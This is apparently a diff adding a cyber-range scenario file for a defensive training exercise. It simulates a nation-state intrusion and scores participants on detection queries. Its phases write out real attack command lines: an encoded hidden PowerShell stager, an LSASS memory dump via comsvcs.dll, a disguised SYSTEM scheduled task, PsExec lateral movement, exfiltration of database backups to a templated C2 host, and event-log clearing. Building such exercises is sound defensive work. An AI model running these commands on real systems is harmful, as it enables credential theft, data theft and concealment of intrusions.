@@ -1,0 +1,275 @@
+name: apt-nation-state
+version: "1.0"
+range_template: large-enterprise
+difficulty: hard
+duration_minutes: 90
+phase_count: 12
+description: |
+  Advanced persistent threat simulation modeled after nation-state adversary
+  tradecraft. The scenario walks through a full kill chain from initial
+  spearphishing to data exfiltration over HTTPS. Participants must detect,
+  track, and respond to a sophisticated multi-stage intrusion across multiple
+  network segments. Emphasizes detection engineering and threat hunting.
+author: TrueNorth Range
+
+mitre_attack:
+  - T1566.001  # Spearphishing Attachment
+  - T1059.005  # Visual Basic (macro execution)
+  - T1053.005  # Scheduled Task / Job
+  - T1570      # Lateral Tool Transfer (PsExec)
+  - T1560.001  # Archive Collected Data: Archive via Utility
+  - T1048.002  # Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
+  - T1003.001  # OS Credential Dumping: LSASS Memory
+  - T1087.002  # Account Discovery: Domain Account
+  - T1018      # Remote System Discovery
+  - T1021.002  # SMB/Windows Admin Shares
+  - T1071.001  # Application Layer Protocol: Web Protocols
+  - T1027      # Obfuscated Files or Information
+
+timeline:
+  - phase: 1
+    t: "00:00"
+    name: "Initial Access - Spearphishing"
+    action: email_phish
+    params:
+      from_address: "external-partner@trusted-gov.org"
+      to_address: "{{ target_user }}@{{ domain }}"
+      subject: "Classified Briefing Document - FOUO"
+      attachment_name: "briefing-2026-Q1.docm"
+      attachment_type: "application/vnd.ms-word.document.macroEnabled.12"
+    mitre: T1566.001
+
+  - phase: 2
+    t: "00:05"
+    name: "Execution - Macro Payload"
+    action: simulated_execution
+    params:
+      host_tag: "ws06"
+      technique: T1059.005
+      process_name: "WINWORD.EXE"
+      child_process: "powershell.exe"
+      command_line: "powershell -nop -w hidden -enc {{ encoded_stager }}"
+      artifacts:
+        - type: file_create
+          path: "C:\\Users\\{{ target_user }}\\AppData\\Local\\Temp\\~WRD0001.tmp"
+    mitre: T1059.005
+
+  - phase: 3
+    t: "00:10"
+    name: "C2 Establishment"
+    action: http_burst
+    params:
+      url: "https://cdn-assets.{{ c2_domain }}/api/v2/check"
+      method: POST
+      count: 15
+      interval_seconds: 30
+      user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+      jitter_percent: 20
+    mitre: T1071.001
+
+  - phase: 4
+    t: "00:15"
+    name: "Discovery - Domain Enumeration"
+    action: simulated_execution
+    params:
+      host_tag: "ws06"
+      technique: T1087.002
+      commands:
+        - "net group \"Domain Admins\" /domain"
+        - "nltest /dclist:{{ domain }}"
+        - "net group \"Enterprise Admins\" /domain"
+        - "adfind.exe -h {{ dc_ip }} -f \"(objectcategory=computer)\" cn operatingSystem"
+    mitre: T1087.002
+
+  - phase: 5
+    t: "00:25"
+    name: "Credential Access - LSASS Dump"
+    action: simulated_execution
+    params:
+      host_tag: "ws06"
+      technique: T1003.001
+      process_name: "rundll32.exe"
+      command_line: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {{ lsass_pid }} C:\\Temp\\debug.dmp full"
+      artifacts:
+        - type: file_create
+          path: "C:\\Temp\\debug.dmp"
+          size_mb: 150
+    mitre: T1003.001
+
+  - phase: 6
+    t: "00:35"
+    name: "Persistence - Scheduled Task"
+    action: simulated_execution
+    params:
+      host_tag: "ws06"
+      technique: T1053.005
+      process_name: "schtasks.exe"
+      command_line: 'schtasks /create /tn "WindowsUpdate" /tr "C:\ProgramData\svchost.exe" /sc daily /st 09:00 /ru SYSTEM'
+    mitre: T1053.005
+
+  - phase: 7
+    t: "00:40"
+    name: "Lateral Movement - PsExec to File Server"
+    action: simulated_execution
+    params:
+      source_host: "ws06"
+      target_host: "fs01"
+      technique: T1570
+      process_name: "psexec.exe"
+      command_line: "psexec.exe \\\\{{ fileserver_ip }} -s cmd.exe"
+      artifacts:
+        - type: service_install
+          name: "PSEXESVC"
+          binary: "C:\\Windows\\PSEXESVC.exe"
+    mitre: T1570
+
+  - phase: 8
+    t: "00:50"
+    name: "Lateral Movement - PsExec to Server VLAN"
+    action: simulated_execution
+    params:
+      source_host: "fs01"
+      target_host: "sql01"
+      technique: T1021.002
+      process_name: "net.exe"
+      command_line: "net use \\\\{{ sql_ip }}\\C$ /user:{{ domain }}\\{{ da_user }} {{ da_pass }}"
+    mitre: T1021.002
+
+  - phase: 9
+    t: "00:55"
+    name: "Discovery - Remote System Scan"
+    action: simulated_execution
+    params:
+      host_tag: "fs01"
+      technique: T1018
+      commands:
+        - "ping -n 1 {{ exchange_ip }}"
+        - "ping -n 1 {{ sharepoint_ip }}"
+        - "net view /domain"
+    mitre: T1018
+
+  - phase: 10
+    t: "01:05"
+    name: "Collection - Data Staging"
+    action: simulated_execution
+    params:
+      host_tag: "sql01"
+      technique: T1560.001
+      process_name: "7z.exe"
+      command_line: "7z a -p{{ archive_password }} C:\\Temp\\backup.7z C:\\SQLData\\*.bak"
+      artifacts:
+        - type: file_create
+          path: "C:\\Temp\\backup.7z"
+          size_mb: 500
+    mitre: T1560.001
+
+  - phase: 11
+    t: "01:15"
+    name: "Exfiltration via HTTPS"
+    action: http_burst
+    params:
+      url: "https://storage.{{ c2_domain }}/upload"
+      method: PUT
+      count: 25
+      total_bytes: 524288000
+      content_type: "application/octet-stream"
+      description: "Exfiltrating archived database backups"
+    mitre: T1048.002
+
+  - phase: 12
+    t: "01:25"
+    name: "Defense Evasion - Cleanup"
+    action: simulated_execution
+    params:
+      technique: T1027
+      hosts: ["ws06", "fs01", "sql01"]
+      commands:
+        - "del /f /q C:\\Temp\\*.dmp"
+        - "del /f /q C:\\Temp\\*.7z"
+        - "wevtutil cl Security"
+        - "wevtutil cl System"
+    mitre: T1070.001
+
+objectives:
+  - id: detect_phish
+    type: detection
+    description: "Identify the spearphishing email delivery"
+    validator: opensearch_query
+    params:
+      query: 'event_type:email AND attachment.name:"briefing-2026-Q1.docm"'
+      min_hits: 1
+    points: 10
+
+  - id: detect_macro
+    type: detection
+    description: "Detect macro execution spawning PowerShell"
+    validator: opensearch_query
+    params:
+      query: 'ParentImage:*WINWORD.EXE AND Image:*powershell.exe'
+      min_hits: 1
+    points: 15
+
+  - id: detect_c2
+    type: detection
+    description: "Identify C2 beacon traffic"
+    validator: opensearch_query
+    params:
+      query: 'event_type:http AND url.domain:*{{ c2_domain }}*'
+      min_hits: 5
+    points: 15
+
+  - id: detect_cred_dump
+    type: detection
+    description: "Detect LSASS memory dumping"
+    validator: opensearch_query
+    params:
+      query: 'process_name:rundll32.exe AND CommandLine:*comsvcs.dll*MiniDump*'
+      min_hits: 1
+    points: 15
+
+  - id: detect_lateral
+    type: detection
+    description: "Identify lateral movement via PsExec"
+    validator: opensearch_query
+    params:
+      query: '(service_name:PSEXESVC) OR (process_name:psexec.exe)'
+      min_hits: 1
+    points: 10
+
+  - id: detect_exfil
+    type: detection
+    description: "Detect large data exfiltration over HTTPS"
+    validator: opensearch_query
+    params:
+      query: 'event_type:flow AND dst_port:443 AND bytes_out:>100000000'
+      min_hits: 1
+    points: 10
+
+  - id: timeline_report
+    type: deliverable
+    description: "Complete incident timeline documenting all 12 phases"
+    validator: deliverable_check
+    params:
+      key: "incident-timeline.pdf"
+      min_phases_documented: 8
+    points: 15
+
+  - id: containment_action
+    type: response
+    description: "Isolate compromised hosts and block C2 domains"
+    validator: manual_ack
+    params:
+      prompt: "Document containment steps: host isolation, DNS blocking, credential reset"
+      required_actions:
+        - "Isolate ws06 from network"
+        - "Block C2 domain at DNS/proxy"
+        - "Reset compromised credentials"
+    points: 10
+
+scoring:
+  total_points: 100
+  passing_score: 70
+  time_bonus:
+    enabled: true
+    max_bonus: 15
+    threshold_minutes: 60
